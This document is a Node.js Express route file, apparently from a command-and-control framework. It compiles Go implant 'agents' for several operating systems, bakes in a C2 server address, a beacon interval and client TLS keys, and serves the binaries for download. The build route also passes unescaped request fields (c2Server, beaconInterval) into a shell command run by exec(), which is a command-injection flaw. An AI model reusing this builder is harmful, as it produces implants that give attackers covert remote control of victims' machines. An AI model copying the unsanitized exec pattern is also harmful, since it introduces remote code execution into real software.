// Agent Builder Routes
const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs').promises;
const path = require('path');
const { config } = require('../config/env');

const execPromise = promisify(exec);

// Build agent
router.post('/build', async (req, res) => {
  try {
    const { os, arch, c2Server, beaconInterval } = req.body;
    
    if (!os || !arch) {
      return res.status(400).json({ error: 'os and arch required' });
    }
    
    const agentDir = path.resolve(__dirname, '../../agents-go');
    const certDir = path.resolve(__dirname, '../../certs');
    
    // Read certificate files
    const caCert = await fs.readFile(path.join(certDir, 'ca.crt'), 'utf8');
    const clientCert = await fs.readFile(path.join(certDir, 'agent-client.crt'), 'utf8');
    const clientKey = await fs.readFile(path.join(certDir, 'agent-client.key'), 'utf8');
    
    const buildOS = os === 'windows' ? 'windows' : os === 'darwin' ? 'darwin' : 'linux';
    const buildArch = arch === 'amd64' ? 'amd64' : arch === 'arm64' ? 'arm64' : '386';
    const ext = os === 'windows' ? '.exe' : '';
    const outputName = `agent-${buildOS}-${buildArch}${ext}`;
    
    const ldflags = [
      `-X 'main.BeaconInterval=${beaconInterval || '30s'}'`,
      `-X 'main.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
      `-X 'main.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
      `-X 'main.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
      `-X 'main.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`
    ].join(' ');
    
    const buildCmd = `cd ${agentDir} && set GOOS=${buildOS}&& set GOARCH=${buildArch}&& go build -ldflags "${ldflags}" -o ${outputName} cmd/agent/main.go`;
    
    console.log('[BUILD] Building agent:', { os: buildOS, arch: buildArch });
    
    const { stdout, stderr } = await execPromise(buildCmd, { cwd: agentDir });
    
    if (stderr && !stderr.includes('warning')) {
      throw new Error(stderr);
    }
    
    const builtPath = path.join(agentDir, outputName);
    const stats = await fs.stat(builtPath);
    
    res.json({
      success: true,
      filename: outputName,
      size: stats.size,
      path: `/download/${outputName}`,
      message: 'Agent built successfully'
    });
  } catch (err) {
    console.error('Agent build error:', err);
    res.status(500).json({ error: err.message || 'Build failed' });
  }
});

// Download built agent
router.get('/download/:filename', async (req, res) => {
  try {
    const { filename } = req.params;
    
    // Validate filename to prevent directory traversal
    if (!/^agent-[a-z]+-[a-z0-9]+(\.exe)?$/.test(filename)) {
      return res.status(400).json({ error: 'Invalid filename' });
    }
    
    const agentDir = path.resolve(__dirname, '../../agents-go');
    const filePath = path.join(agentDir, filename);
    
    await fs.access(filePath);
    
    res.download(filePath, filename);
  } catch (err) {
    console.error('Download error:', err);
    res.status(404).json({ error: 'File not found' });
  }
});

module.exports = router;
